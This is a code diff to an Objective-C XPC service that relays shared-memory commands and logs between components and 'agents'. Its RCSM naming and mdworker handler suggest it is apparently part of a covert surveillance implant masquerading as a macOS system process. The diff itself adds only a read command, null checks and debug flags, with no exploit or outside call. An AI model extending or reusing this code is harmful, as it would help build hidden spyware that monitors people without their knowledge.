@@ -13,6 +13,8 @@
 #import "RCSMCommon.h"
 #import "RCSMSharedMemory.h"
 
+//#define DEBUG_XPC
+
 int gMemLogMaxSize     = 0x302460;
 int gMemCommandMaxSize = 0x4000;
 RCSMSharedMemory *gSharedMemoryCommand = nil;
@@ -44,7 +46,7 @@ static BOOL initSharedMemory()
   }
   
   gSharedMemoryLogging = [[RCSMSharedMemory alloc] initWithKey: memKeyForLogging
-                                                          size: gSharedMemoryLogging
+                                                          size: gMemLogMaxSize
                                                  semaphoreName: SHMEM_SEM_NAME];
   
   if (gSharedMemoryLogging && [gSharedMemoryLogging createMemoryRegion] == -1)
@@ -97,7 +99,7 @@ static void mdworker_server_peer_event_handler(xpc_connection_t peer, xpc_object
     switch (cmd) 
     {
         // Read from shared mem
-      case 0:
+      case READ_XPC_CMD:
       {
         uint32 anOffset   = (uint32)xpc_dictionary_get_int64(event, "offset");
         uint32 aComponent = (uint32)xpc_dictionary_get_int64(event, "component"); 
@@ -105,20 +107,57 @@ static void mdworker_server_peer_event_handler(xpc_connection_t peer, xpc_object
         NSMutableData *replyData = [gSharedMemoryCommand readMemory:anOffset 
                                                       fromComponent:aComponent];
         
-        if (replyData == nil) 
+        if (replyData == nil || (replyData && [replyData length] == 0)) 
           replyData = [NSMutableData dataWithBytes: &nullCmd 
                                             length: sizeof(nullCmd)];
         
         reply = xpc_dictionary_create_reply(event);
-        
         xpc_object_t data = xpc_data_create([replyData bytes], [replyData length]);
         
-        xpc_dictionary_set_value(reply, "data", data);
+        if (reply != NULL && data != NULL) 
+          xpc_dictionary_set_value(reply, "data", data);
+        else
+        {
+          if (reply)
+          {
+            xpc_release(reply);
+            reply = NULL;
+          }
+        }
+
+      }  
+        break;
+      case READ_XPC_COMP_CMD:
+      {     
+        uint32 aComponent     = (uint32)xpc_dictionary_get_int64(event, "component"); 
+        uint32 anAgentID      = (uint32)xpc_dictionary_get_int64(event, "agent");
+        uint32 aCommandType   = (uint32)xpc_dictionary_get_int64(event, "type");
         
+        NSMutableData *replyData = [gSharedMemoryLogging readMemoryFromComponent: aComponent 
+                                                                        forAgent: anAgentID 
+                                                                 withCommandType: aCommandType];
+        
+        if (replyData == nil || (replyData && [replyData length] == 0)) 
+          replyData = [NSMutableData dataWithBytes: &nullCmd 
+                                            length: sizeof(nullCmd)];
+               
+        reply = xpc_dictionary_create_reply(event);
+        xpc_object_t data = xpc_data_create([replyData bytes], [replyData length]);
+        
+        if (reply != NULL && data != NULL) 
+          xpc_dictionary_set_value(reply, "data", data);
+        else
+        {
+          if (reply)
+          {
+            xpc_release(reply);
+            reply = NULL;
+          }
+        }
       }  
         break;
         // Write to shared mem
-      case 1:
+      case WRITE_XPC_CMD:
       {
         size_t len = 0;
         BOOL ret = FALSE;
@@ -140,7 +179,18 @@ static void mdworker_server_peer_event_handler(xpc_connection_t peer, xpc_object
         
         xpc_object_t data = xpc_data_create(&ret, sizeof(ret));
         
-        xpc_dictionary_set_value(reply, "data", data);
+        if (reply != NULL && data != NULL) 
+        {
+          xpc_dictionary_set_value(reply, "data", data);
+        }
+        else
+        {
+          if (reply)
+          {
+            xpc_release(reply);
+            reply = NULL;
+          }
+        }
       }
         break;
     }
@@ -167,7 +217,7 @@ static void mdworker_server_event_handler(xpc_connection_t peer)
 
 static void killingService()
 {
-#ifdef DEBUG_XPC_TMP
+#ifdef DEBUG_XPC
   NSLog(@"%s: killing xpc service", __FUNCTION__);
 #endif
   
@@ -190,7 +240,7 @@ int main(int argc, const char *argv[])
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
-#ifdef DEBUG_XPC_TMP
+#ifdef DEBUG_XPC
   NSLog(@"%s: enter xpc service", __FUNCTION__);
 #endif
   
@@ -199,7 +249,7 @@ int main(int argc, const char *argv[])
   
   if (initSharedMemory() == NO)
   {
-#ifdef DEBUG_XPC_TMP
+#ifdef DEBUG_XPC
     NSLog(@"%s:error creating  shared mem", __func__);
 #endif
     
